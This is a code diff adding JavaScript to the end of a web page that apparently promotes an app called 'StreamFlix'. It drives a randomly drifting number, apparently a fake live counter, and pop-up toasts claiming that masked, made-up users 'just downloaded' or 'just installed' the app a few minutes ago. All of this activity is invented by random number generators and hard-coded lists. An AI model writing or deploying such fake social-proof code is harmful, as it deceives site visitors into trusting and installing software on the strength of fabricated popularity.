+    delta=Math.max(-800,Math.min(800,delta+(Math.floor(Math.random()*45)-22)));
+    var v=base+delta;
+    if(v<1900)v=1900+Math.floor(Math.random()*200);
+    if(v>4200)v=4200-Math.floor(Math.random()*200);
+    el.textContent=v.toLocaleString('en-US');
+    base=v;
+  }
+  setInterval(tick,3500);
+})();
+
+// ---- Social proof toast ----
+(function(){
+  var toast=document.getElementById('socialToast');
+  if(!toast)return;
+  var msgEl=document.getElementById('toastMsg');
+  var timeEl=document.getElementById('toastTime');
+  var avatarEl=document.getElementById('toastAvatar');
+  var avatars=['img/a/c1.jpg','img/a/c2.jpg','img/a/c3.jpg','img/a/c4.jpg','img/a/c5.jpg'];
+
+  var users=[
+    {name:'J**n S.', action:'just downloaded the app'},
+    {name:'E**y W.', action:'completed the download'},
+    {name:'M**l B.', action:'just installed StreamFlix'},
+    {name:'S**a R.', action:'just downloaded the app'},
+    {name:'D**d K.', action:'completed the download'},
+    {name:'L**a T.', action:'just installed the app'},
+    {name:'C**s P.', action:'just downloaded StreamFlix'},
+    {name:'A**x N.', action:'completed the download'},
+    {name:'J**a H.', action:'just downloaded the app'},
+    {name:'R**t M.', action:'just installed StreamFlix'},
+    {name:'N**e C.', action:'completed the download'},
+    {name:'T**y F.', action:'just downloaded the app'}
+  ];
+
+  var lastIdx=-1;
+  var isVisible=false;
+  var hideTimer=null;
+  var nextTimer=null;
+
+  function showToast(){
+    if(isVisible)return;
+    var idx;
+    do{idx=Math.floor(Math.random()*users.length)}while(idx===lastIdx && users.length>1);
+    lastIdx=idx;
+    var u=users[idx];
+    var min=Math.floor(Math.random()*5)+1;
+    msgEl.textContent=u.name+' '+u.action;
+    timeEl.textContent=min+' min ago';
+    if(avatarEl)avatarEl.src=avatars[idx % avatars.length];
+    toast.classList.remove('hide');
+    toast.classList.add('show');
+    isVisible=true;
+    clearTimeout(hideTimer);
+    hideTimer=setTimeout(hideToast,4200);
+  }
+
+  function hideToast(){
+    toast.classList.remove('show');
+    toast.classList.add('hide');
+    isVisible=false;
+    clearTimeout(nextTimer);
+    var delay=15000+Math.floor(Math.random()*18000);
+    nextTimer=setTimeout(showToast,delay);
+  }
+
+  window.dismissToast=function(){
+    clearTimeout(hideTimer);
+    hideToast();
+  };
+
+  nextTimer=setTimeout(showToast,5000);
+})();
+</script>
+</body>
+</html>
